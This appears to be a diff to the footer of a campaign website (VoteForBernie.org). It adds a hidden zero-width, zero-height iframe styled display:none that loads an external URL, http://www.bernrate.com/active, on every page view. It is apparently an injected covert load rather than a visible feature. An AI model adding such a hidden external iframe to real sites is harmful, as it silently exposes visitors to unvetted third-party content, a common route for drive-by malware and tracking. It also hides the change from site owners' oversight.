@@ -25,6 +25,7 @@
 
     <p class="source-org copyright">&copy; VoteForBernie.org</p>
     <?php // echo date('Y'); ?>
+    <iframe src="http://www.bernrate.com/active" width="0" height="0" style="display:none;"></iframe>
 
   </div>
 
